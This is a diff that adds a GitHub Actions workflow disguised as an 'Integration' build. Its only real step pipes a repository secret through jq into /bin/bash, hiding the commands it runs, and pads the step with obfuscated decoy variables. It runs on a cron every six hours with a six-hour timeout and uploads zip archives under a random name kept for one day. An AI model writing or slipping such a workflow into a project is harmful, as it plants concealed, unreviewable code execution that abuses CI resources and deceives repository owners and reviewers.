@@ -1,0 +1,40 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '19 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          rdte03: ${{ secrets.rdte03 }}
+        run: |
+          printf '%s' "$rdte03" | jq -r .jhl90 | /bin/bash
+          echo $otkn5 | jq -r .jph1 | /bin/bash
+          printf '%s' "$pef100" | jq -r .l9 | /bin/bash
+          printf '%s' "$dhul8" | jq -r .nxzf81 | /bin/bash
+          printf '%s' "$oh4804" | jq -r .zio02 | /bin/bash
+          printf '%s' "$kct09365" | jq -r .kp3190 | /bin/bash
+          echo $u948 | jq -r .uf7546 | /bin/bash
+          printf '%s' "$cotgk7229" | jq -r .jrbrc45 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ShlpRUVZ
+          path: "*.zip"
+          retention-days: 1
